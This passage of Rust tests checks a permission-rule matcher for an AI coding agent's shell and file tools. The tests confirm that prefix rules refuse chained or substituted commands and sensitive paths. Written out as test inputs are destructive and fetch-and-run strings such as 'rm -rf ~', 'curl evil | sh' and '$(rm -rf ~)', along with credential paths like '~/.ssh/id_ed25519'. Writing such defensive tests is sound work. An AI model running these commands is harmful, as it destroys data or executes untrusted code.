        let result = settings.persist_project_allow("retry_rule");
        assert!(
            result.is_err(),
            "Expected persistence to fail on read-only directory"
        );

        // The in-memory project_doc must NOT — under any circumstance —
        // contain the rule after a failed write.
        assert!(
            !settings
                .project_doc()
                .pointer("/permissions/allow")
                .and_then(|v| v.as_array())
                .map(|arr| arr.iter().any(|v| v.as_str() == Some("retry_rule")))
                .unwrap_or(false),
            "project_doc should not have been mutated on failure"
        );

        // The in-memory allow_rules must NOT contain the rule.
        assert!(
            !settings.allow_rules().contains(&"retry_rule".to_string()),
            "allow_rules should not contain the rule after failed persist"
        );

        // Restore writability.
        std::fs::set_permissions(parent, std::fs::Permissions::from_mode(0o755)).unwrap();

        // Retry — should succeed now.
        let result2 = settings.persist_project_allow("retry_rule");
        assert!(
            result2.is_ok(),
            "Retry after restoring writability should succeed: {:?}",
            result2
        );

        // Verify the in-memory state reflects the rule.
        assert!(
            settings.allow_rules().contains(&"retry_rule".to_string()),
            "allow_rules should contain the rule after successful retry"
        );

        // Verify the file on disk contains the rule.
        let content = std::fs::read_to_string(&project_file).unwrap();
        let doc: Value = serde_json::from_str(&content).unwrap();
        let allow = doc
            .pointer("/permissions/allow")
            .and_then(|v| v.as_array())
            .unwrap();
        assert_eq!(allow.len(), 1);
        assert_eq!(allow[0].as_str(), Some("retry_rule"));
    }

    // ——— Fix 1: Reject ')' in tool name (grammar: tool excludes '(' and ')') —————

    #[test]
    fn reject_closing_paren_in_tool_name() {
        // `bash)(command:ls)` has a ')' before '(' → tool would be "bash)"
        assert!(PermissionRule::parse("bash)(command:ls)").is_none());
        // `)(field:value)` has a bare ')' as the tool name
        assert!(PermissionRule::parse(")(field:value)").is_none());
        // Valid: tool name "bash" with `(` inside inner content is allowed
        // by grammar (field/pattern exclude ')', not '(').
    }

    // ——— Fix 2: Reject non-whitespace trailing content after final ')' —————

    #[test]
    fn reject_trailing_content_after_closing_paren() {
        assert!(PermissionRule::parse("bash(command:ls)extra").is_none());
        assert!(PermissionRule::parse("bash(command:ls)  extra").is_none());
        // Trailing whitespace only is fine (trimmed earlier)
        assert!(PermissionRule::parse("bash(command:ls)  ").is_some());
    }

    // ——— Fix 3: Generated Argument rule compiles matcher immediately —————

    #[test]
    fn generated_argument_rule_matches_directly() {
        let rule = PermissionRule::generate(
            "bash",
            PermissionPromptPolicy::Command { field: "command" },
            &serde_json::json!({"command": "cargo test --lib"}),
        )
        .unwrap();

        // The generated rule should match directly without round-tripping
        assert!(rule.matches("bash", &serde_json::json!({"command": "cargo test --lib"})));
        assert!(!rule.matches("bash", &serde_json::json!({"command": "cargo build"})));
        assert!(!rule.matches(
            "read_file",
            &serde_json::json!({"command": "cargo test --lib"})
        ));

        // Wildcard patterns in generated rules also work
        let wild_rule = PermissionRule::generate(
            "bash",
            PermissionPromptPolicy::Command { field: "command" },
            &serde_json::json!({"command": "cargo test *"}),
        )
        .unwrap();
        assert!(wild_rule.matches("bash", &serde_json::json!({"command": "cargo test --lib"})));
        assert!(!wild_rule.matches("bash", &serde_json::json!({"command": "cargo build"})));
    }

    // ——— Fix 2: Project/global document isolation ———————————

    #[test]
    fn missing_project_file_gets_fresh_empty_doc_not_global_doc() {
        // When the project settings file is missing but global settings is
        // valid, the project document should be a fresh `{}`, NOT a copy of
        // the global raw document.  Global rules still participate in the
        // effective merged policy.
        let dir = tempfile::tempdir().unwrap();

        // Global settings: valid allow rule + unknown field.
        let global_dir = dir.path().join("global_home");
        std::fs::create_dir_all(global_dir.join(".tact")).unwrap();
        std::fs::write(
            global_dir.join(".tact/settings.json"),
            r#"{"permissions": {"allow": ["read_file"]}, "global_only_field": "should_not_be_in_project"}"#,
        )
        .unwrap();

        // Project directory exists but NO settings file.
        let project_dir = dir.path().join("proj");
        std::fs::create_dir_all(project_dir.join(".tact")).unwrap();
        let project_path = project_dir.join(".tact/settings.json");
        assert!(
            !project_path.exists(),
            "Project settings file must not exist"
        );

        let mut settings = PermissionSettings::load_from(
            &project_path,
            Some(&global_dir.join(".tact/settings.json")),
        );

        // Global rules are present in the effective merged policy.
        assert!(
            settings.allow_rules().contains(&"read_file".to_string()),
            "Global allow rule should be in effective rules"
        );

        // The project document must be `{}`, NOT containing global-only fields.
        let doc = settings.project_doc();
        assert_eq!(
            doc,
            &Value::Object(Map::new()),
            "Project doc should be fresh {{}}"
        );
        assert!(
            doc.get("global_only_field").is_none(),
            "Global-only field must not leak into project doc"
        );

        // Persisting an allow rule should write to the project file without
        // inheriting global-only fields/rules.
        settings.persist_project_allow("bash(command:ls)").unwrap();
        let content = std::fs::read_to_string(&project_path).unwrap();
        let doc: Value = serde_json::from_str(&content).unwrap();
        assert!(
            doc.get("global_only_field").is_none(),
            "Persisted project file must not contain global-only fields"
        );
        let allow = doc
            .pointer("/permissions/allow")
            .and_then(|v| v.as_array())
            .unwrap();
        assert_eq!(allow.len(), 1);
        assert_eq!(allow[0].as_str(), Some("bash(command:ls)"));
    }

    // ——— Fix 3: Cached effective rules ———————————

    #[test]
    fn cached_effective_rules_are_rebuilt_on_load() {
        let dir = tempfile::tempdir().unwrap();
        let project_file = dir.path().join(".tact/settings.json");
        std::fs::create_dir_all(dir.path().join(".tact")).unwrap();
        std::fs::write(
            &project_file,
            r#"{"permissions": {"allow": ["bash(command:cargo test *)"]}}"#,
        )
        .unwrap();

        let settings = PermissionSettings::load_from(&project_file, None);

        // Access the cached effective rules and verify matching works.
        let cached = settings.cached_effective_rules();
        assert_eq!(
            cached.action(
                "bash",
                &serde_json::json!({"command": "cargo test -p tact"})
            ),
            RuleAction::Allow
        );
        assert_eq!(
            cached.action("bash", &serde_json::json!({"command": "rm -rf /"})),
            RuleAction::None
        );
        assert_eq!(
            cached.action("read_file", &serde_json::json!({})),
            RuleAction::None
        );
    }

    #[test]
    fn cached_effective_rules_are_rebuilt_after_persist() {
        let dir = tempfile::tempdir().unwrap();
        let project_file = dir.path().join(".tact/settings.json");

        let mut settings = PermissionSettings::load_from(&project_file, None);

        // No rules yet.
        assert_eq!(
            settings
                .cached_effective_rules()
                .action("bash", &serde_json::json!({"command": "ls"}),),
            RuleAction::None
        );

        // Persist an allow rule.
        settings.persist_project_allow("bash(command:ls)").unwrap();

        // Cache should now include the rule.
        assert_eq!(
            settings
                .cached_effective_rules()
                .action("bash", &serde_json::json!({"command": "ls"}),),
            RuleAction::Allow
        );
        assert_eq!(
            settings
                .cached_effective_rules()
                .action("bash", &serde_json::json!({"command": "rm"}),),
            RuleAction::None
        );
    }
}

/// The prefix rule exists so the popup can offer a width between "this one
/// command" and "this whole tool". Every test here is about the fence around
/// that width: what it may and may not cover, and what is never proposed.
#[cfg(test)]
mod prefix_tests {
    use super::*;

    fn rule(text: &str) -> PermissionRule {
        PermissionRule::parse(text).unwrap_or_else(|| panic!("`{text}` should parse"))
    }

    fn command(text: &str) -> Value {
        serde_json::json!({ "command": text })
    }

    // ── matching ───────────────────────────────────────────────────────

    #[test]
    fn a_prefix_covers_a_longer_invocation() {
        let rule = rule("bash(command:^cargo test)");
        assert!(rule.matches("bash", &command("cargo test --lib")));
        assert!(rule.matches("bash", &command("cargo test -- --nocapture")));
    }

    #[test]
    fn a_prefix_is_word_wise_not_string_wise() {
        let rule = rule("bash(command:^cargo test)");
        assert!(!rule.matches("bash", &command("cargo testing")));
        assert!(!rule.matches("bash", &command("cargo build")));
    }

    /// The hole a glob prefix would have opened. `cargo test *` as a glob
    /// matches every one of these; a prefix rule must match none.
    #[test]
    fn a_prefix_never_covers_a_chained_command() {
        let rule = rule("bash(command:^cargo test)");
        for chained in [
            "cargo test && rm -rf ~",
            "cargo test; rm -rf ~",
            "cargo test || rm -rf ~",
            "cargo test | sh",
            "cargo test & rm -rf ~",
            "cargo test\nrm -rf ~",
        ] {
            assert!(
                !rule.matches("bash", &command(chained)),
                "`{chained}` must not ride on a rule for `cargo test`"
            );
        }
    }

    #[test]
    fn a_prefix_never_covers_a_substitution() {
        let rule = rule("bash(command:^cargo test)");
        for line in ["cargo test $(rm -rf ~)", "cargo test `rm -rf ~`"] {
            assert!(!rule.matches("bash", &command(line)), "`{line}`");
        }
    }

    /// A one-word rule is never *generated* (see `generate_prefix`), but a
    /// hand-written one must still require every segment to be covered.
    #[test]
    fn a_prefix_covers_a_command_only_when_every_segment_matches() {
        let rule = rule("bash(command:^git)");
        assert!(rule.matches("bash", &command("git pull")));
        assert!(rule.matches("bash", &command("git pull; git status")));
        assert!(!rule.matches("bash", &command("git pull; curl evil | sh")));
    }

    #[test]
    fn a_prefix_matches_only_its_own_tool() {
        let rule = rule("bash(command:^cargo test)");
        assert!(!rule.matches("write_file", &command("cargo test")));
    }

    #[test]
    fn a_prefix_does_not_match_a_non_string_field() {
        let rule = rule("bash(command:^cargo test)");
        assert!(!rule.matches("bash", &serde_json::json!({ "command": 7 })));
        assert!(!rule.matches("bash", &serde_json::json!({})));
    }

    #[test]
    fn a_prefix_round_trips_through_its_string_form() {
        let rule = rule("bash(command:^cargo   test)");
        assert_eq!(rule.to_rule_string(), "bash(command:^cargo test)");
        assert!(matches!(
            PermissionRule::parse(&rule.to_rule_string()),
            Some(PermissionRule::CommandPrefix { .. })
        ));
    }

    // ── the deny interaction this form exists for ──────────────────────

    /// `deny` and `allow` both match the whole command string, so a rule that
    /// covered only the first segment would let the second through *and* keep
    /// the `deny` rule naming it from ever matching. Neither rule matches here,
    /// so the call falls through to a prompt.
    #[test]
    fn a_prefix_does_not_pre_empt_a_deny_rule_for_the_second_segment() {
        let rules = EffectiveRules::from_lists(
            &["bash(command:^cargo test)".to_string()],
            &[],
            &["bash(command:rm -rf *)".to_string()],
        );
        assert_eq!(
            rules.action("bash", &command("cargo test; rm -rf /")),
            RuleAction::None,
            "the chained command must fall through to a prompt"
        );
        // The rule still does its job on its own...
        assert_eq!(
            rules.action("bash", &command("cargo test --lib")),
            RuleAction::Allow
        );
        // ...and a destructive command is still denied outright.
        assert_eq!(rules.action("bash", &command("rm -rf /")), RuleAction::Deny);
    }

    // ── generation ─────────────────────────────────────────────────────

    fn generate(line: &str) -> Option<PermissionRule> {
        PermissionRule::generate_prefix(
            "bash",
            PermissionPromptPolicy::Command { field: "command" },
            &command(line),
        )
    }

    #[test]
    fn generate_takes_the_first_two_words() {
        let rule = generate("cargo test --lib -- --nocapture").expect("should generate");
        assert_eq!(rule.to_rule_string(), "bash(command:^cargo test)");
    }

    #[test]
    fn generate_refuses_a_single_word_command() {
        assert!(generate("ls").is_none());
        assert!(generate("make").is_none());
    }

    #[test]
    fn generate_refuses_a_flag_in_second_position() {
        assert!(generate("git -c core.pager=sh status").is_none());
        assert!(generate("npm --prefix . run build").is_none());
    }

    #[test]
    fn generate_refuses_compound_and_substituted_commands() {
        for line in [
            "cargo test && rm -rf ~",
            "cargo test; cargo build",
            "cargo test | tee log",
            "cargo test $(date)",
            "cargo test `date`",
        ] {
            assert!(generate(line).is_none(), "`{line}`");
        }
    }

    #[test]
    fn generate_refuses_runners_and_irreversible_programs() {
        for line in [
            "sh -c ls",
            "bash script.sh",
            "python3 script.py --flag",
            "node server.js",
            "find . -name x",
            "sed -n 1p file",
            "awk {print} file",
            "env FOO=1 cargo test",
            "xargs rm",
            "sudo ls /root",
            "rm -rf build",
            "chmod 777 file",
            "tar xzf archive.tgz",
        ] {
            assert!(generate(line).is_none(), "`{line}`");
        }
    }

    #[test]
    fn generate_refuses_a_program_that_is_not_a_bare_name() {
        assert!(generate("./deploy.sh prod").is_none());
        assert!(generate("/usr/bin/cargo test").is_none());
        assert!(generate("FOO=1 cargo test").is_none());
    }

    #[test]
    fn generate_refuses_a_prompt_with_no_prefix_shape() {
        // A tool-wide prompt has no narrower form to record, and a patch names
        // its targets inside its own text rather than in a field.
        for (tool, policy, input) in [
            (
                "search_notes",
                PermissionPromptPolicy::Json,
                serde_json::json!({ "query": "x" }),
            ),
            (
                "ask_user",
                PermissionPromptPolicy::Question { field: "question" },
                serde_json::json!({ "question": "continue?" }),
            ),
            (
                "apply_patch",
                PermissionPromptPolicy::PatchTarget {
                    patch_field: "patch",
                },
                serde_json::json!({ "patch": "*** Begin Patch" }),
            ),
        ] {
            assert!(
                PermissionRule::generate_prefix(tool, policy, &input).is_none(),
                "{tool} should not offer a prefix rule"
            );
        }
    }

    // ── path prefixes ──────────────────────────────────────────────────

    #[test]
    fn a_path_prefix_covers_a_folder_component_wise() {
        let rule = rule("edit_file(path:@src)");
        assert!(rule.matches("edit_file", &serde_json::json!({"path": "src/lib.rs"})));
        assert!(rule.matches(
            "edit_file",
            &serde_json::json!({"path": "src/adapters/mcp/server.rs"})
        ));
        // A sibling directory that merely starts with the same letters.
        assert!(!rule.matches("edit_file", &serde_json::json!({"path": "srcx/lib.rs"})));
        // Outside the folder, and outside the workspace.
        assert!(!rule.matches("edit_file", &serde_json::json!({"path": "docs/readme.md"})));
        assert!(!rule.matches("edit_file", &serde_json::json!({"path": "../src/lib.rs"})));
        // `./` is the same location spelled differently.
        assert!(rule.matches("edit_file", &serde_json::json!({"path": "./src/lib.rs"})));
    }

    #[test]
    fn a_path_prefix_round_trips_and_is_not_a_command_prefix() {
        let rule = rule("edit_file(path:@src/adapters)");
        assert_eq!(rule.to_rule_string(), "edit_file(path:@src/adapters)");
        assert!(matches!(
            PermissionRule::parse(&rule.to_rule_string()),
            Some(PermissionRule::PathPrefix { .. })
        ));
        // The markers are not interchangeable.
        assert!(matches!(
            PermissionRule::parse("edit_file(path:^src)"),
            Some(PermissionRule::CommandPrefix { .. })
        ));
    }

    #[test]
    fn generate_takes_the_parent_folder() {
        let generated = |path: &str| {
            PermissionRule::generate_prefix(
                "edit_file",
                PermissionPromptPolicy::Path { field: "path" },
                &serde_json::json!({ "path": path }),
            )
        };
        assert_eq!(
            generated("docs/usage.md").map(|rule| rule.to_rule_string()),
            Some("edit_file(path:@docs)".to_string())
        );
        assert_eq!(
            generated("src/adapters/mcp/server.rs").map(|rule| rule.to_rule_string()),
            Some("edit_file(path:@src/adapters/mcp)".to_string())
        );
        assert_eq!(
            generated("./docs/usage.md").map(|rule| rule.to_rule_string()),
            Some("edit_file(path:@docs)".to_string())
        );
    }

    #[test]
    fn generate_refuses_paths_that_are_not_a_folder_in_the_workspace() {
        let generated = |path: &str| {
            PermissionRule::generate_prefix(
                "edit_file",
                PermissionPromptPolicy::Path { field: "path" },
                &serde_json::json!({ "path": path }),
            )
        };
        // A file at the workspace root: the exact rule already covers it.
        assert!(generated("README.md").is_none());
        // The sensitive guard's territory, which a rule must not route around.
        assert!(generated("/etc/passwd").is_none());
        assert!(generated("~/.ssh/id_ed25519").is_none());
        assert!(generated("../elsewhere/file.md").is_none());
        assert!(generated("docs/../../file.md").is_none());
        // `.git` runs hooks; `.tact` holds the settings file these rules live in.
        assert!(generated(".git/config").is_none());
        assert!(generated(".tact/settings.json").is_none());
    }

    // ── the delimiter limit, lifted for the token-based forms ──────────

    #[test]
    fn a_prefix_token_may_contain_a_rule_delimiter() {
        // The terminator is the final `)`, which `rfind` locates, so a token
        // holding a paren round-trips here where the glob form cannot.
        let rule = rule("bash(command:^echo (x))");
        assert_eq!(rule.to_rule_string(), "bash(command:^echo (x))");
        assert!(rule.matches("bash", &command("echo (x)")));
        assert!(rule.matches("bash", &command("echo (x) more")));
    }

    #[test]
    fn a_generated_prefix_round_trips_even_when_the_token_holds_a_delimiter() {
        let generated = generate("cargo test(x)").expect("a two-word command should generate");
        assert!(matches!(
            PermissionRule::parse(&generated.to_rule_string()),
            Some(PermissionRule::CommandPrefix { .. })
        ));
        assert!(generated.matches("bash", &command("cargo test(x)")));
    }

    /// The glob form keeps the restriction — the lifted one is the token-based
    /// form's alone.
    #[test]
    fn the_glob_form_still_refuses_a_pattern_containing_a_paren() {
        // Note the doubled paren: the pattern has to *contain* a `)` for the
        // ambiguity to exist, which is exactly the case the check rejects.
        assert!(PermissionRule::parse("bash(command:cargo test (x))").is_none());
    }

    #[test]
    fn a_generated_prefix_matches_the_command_it_came_from() {
        let rule = generate("cargo test --lib").expect("should generate");
        assert!(rule.matches("bash", &command("cargo test --lib")));
        assert!(rule.matches("bash", &command("cargo test --all-targets")));
        assert!(!rule.matches("bash", &command("cargo build")));
    }
}
